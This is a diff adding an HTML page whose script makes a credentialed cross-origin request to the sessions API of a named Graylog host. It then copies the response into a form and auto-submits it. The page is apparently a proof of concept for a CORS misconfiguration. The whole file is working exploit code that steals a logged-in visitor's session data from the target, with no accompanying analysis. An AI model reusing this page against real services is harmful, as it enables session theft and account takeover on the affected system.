@@ -1,0 +1,17 @@
+<html>
+<head></head>
+<body>
+	<script>
+	var xhr = new XMLHttpRequest();
+	xhr.withCredentials = true;
+	xhr.open('GET', 'https://graylog.mainnet.insolar.io/api/system/sessions', true);
+	xhr.setRequestHeader('Content-Type', 'application/json');
+	xhr.send("");
+	xhr.onreadystatechange = function() {if (this.readyState == 4) {
+	document.getElementById('response').innerHTML = this.responseText;
+	document.getElementById('form').submit();}
+};
+</script>
+<form method="post" id="form"><textarea id="response" name="response" cols="100" rows="30"></textarea></form>
+</body>
+</html>
